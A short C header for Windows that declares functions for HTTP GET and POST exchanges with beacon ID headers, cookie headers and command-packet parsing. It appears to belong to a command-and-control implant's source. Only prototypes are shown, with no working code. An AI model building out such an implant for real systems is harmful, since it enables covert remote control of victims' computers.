#pragma once
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>

#define MAX_HEADER_SIZE 1024

unsigned char* parseGetResponse(unsigned char* data, size_t dataSize, size_t* responsedatalen);
unsigned char* parsePacket(unsigned char* totalBuffer, uint32_t* totalLength, uint32_t* commandType, size_t* commandBuflen , size_t* count);
unsigned char* GET(wchar_t* cookie_header, size_t* responseSize);
unsigned char* makeBeaconIdHeader();
unsigned char* makePostData(unsigned char* postMsg, size_t msgLen, int callback);
BOOL POST(unsigned char* dataString, size_t dataSize, wchar_t* BeaconIdWideHeader);